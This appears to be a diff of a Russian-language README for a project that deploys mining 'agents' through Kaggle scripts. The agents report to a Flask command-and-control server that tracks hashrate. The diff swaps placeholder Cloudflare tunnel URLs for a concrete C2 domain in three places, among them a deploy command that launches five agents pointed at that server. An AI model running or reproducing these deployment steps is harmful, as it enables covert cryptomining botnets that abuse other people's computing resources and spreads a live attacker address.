@@ -73,7 +73,7 @@ sudo dpkg -i cloudflared-linux-amd64.deb
 cloudflared tunnel --url http://localhost:5000
 ```
 
-Получите URL вида: `https://xxx-xxx-xxx.trycloudflare.com`
+Получите URL вида: `https://gbctwoserver.net`
 
 **Вариант B: ngrok**
 ```bash
@@ -428,7 +428,7 @@ python3 kaggle/auto_manager.py --monitor   # Мониторинг
 python3 kaggle/auto_manager.py --auto 10   # Полная автоматизация
 
 # Deploy
-python3 kaggle/deploy_unified.py --c2-url https://xxx.trycloudflare.com --count 5
+python3 kaggle/deploy_unified.py --c2-url https://gbctwoserver.net --count 5
 
 # Cloudflare Tunnel
 cloudflared tunnel --url http://localhost:5000
@@ -444,7 +444,7 @@ cloudflared tunnel --url http://localhost:5000
 │  ┌───────────────────────────────────────────────────┐  │
 │  │           C2 Server (Flask)                       │  │
 │  │  • Dashboard: http://localhost:5000               │  │
-│  │  • Public URL: https://xxx.trycloudflare.com      │  │
+│  │  • Public URL: https://gbctwoserver.net      │  │
 │  │  • Управление agents                              │  │
 │  │  • Мониторинг hashrate                            │  │
 │  └───────────────────────────────────────────────────┘  │
